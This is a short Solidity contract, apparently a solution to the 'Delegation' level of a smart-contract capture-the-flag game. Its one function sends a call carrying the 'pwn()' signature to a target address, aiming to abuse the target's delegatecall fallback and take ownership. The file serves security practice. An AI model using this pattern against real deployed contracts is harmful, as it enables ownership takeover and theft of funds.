// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Delegation.sol";

contract DelegationAttract{
    function att(address addr) public payable  {
        bytes memory data = abi.encodeWithSignature("pwn()");
        addr.call(data);
    }
}